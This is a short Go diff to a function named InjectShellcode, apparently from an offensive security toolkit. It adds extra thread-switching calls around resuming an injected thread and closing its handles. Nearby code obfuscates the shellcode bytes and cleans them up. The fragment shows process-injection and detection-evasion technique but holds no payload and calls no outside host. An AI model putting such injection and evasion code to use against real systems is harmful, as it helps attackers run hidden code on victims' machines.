@@ -82,12 +82,15 @@ func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, session0, wait
 	}
 	security.CoverBytes(shellcode)
 	// -------------------------------------execute shellcode--------------------------------------
-	security.SwitchThread()
+	for i := 0; i < 5; i++ {
+		security.SwitchThread()
+	}
 	_, err = windows.ResumeThread(hThread)
 	if err != nil {
 		return errors.Wrap(err, "failed to resume thread")
 	}
 	// close process handle at once and reopen after execute finish
+	security.SwitchThread()
 	api.CloseHandle(hProcess)
 	processHandleClosed = true
 	if wait { // wait thread for wait shellcode execute finish
@@ -98,6 +101,7 @@ func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, session0, wait
 		}
 	}
 	// close thread handle at once
+	security.SwitchThread()
 	api.CloseHandle(hThread)
 	threadHandleClosed = true
 	// clean shellcode
